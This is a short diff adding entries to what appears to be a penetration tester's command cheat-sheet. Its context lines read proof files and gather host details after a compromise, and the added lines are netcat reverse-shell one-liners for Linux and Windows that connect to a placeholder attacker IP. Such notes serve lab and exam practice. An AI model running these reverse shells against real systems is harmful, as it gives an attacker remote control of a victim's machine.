@@ -250,3 +250,9 @@ hostname && whoami && id && cat /root/proof.txt && ifconfig
 
 # post-exploitation - windows - reporting - moneyshot
 hostname && whoami && type c:\users\administrator\desktop\proof.txt && ipconfig
+
+# reverse shell - netcat - linux
+nc <ATTACKER IP> <PORT> –e /bin/bash
+
+# reverse shell - netcat - windows
+nc.exe <ATTACKER IP> <PORT> –e cmd.exe
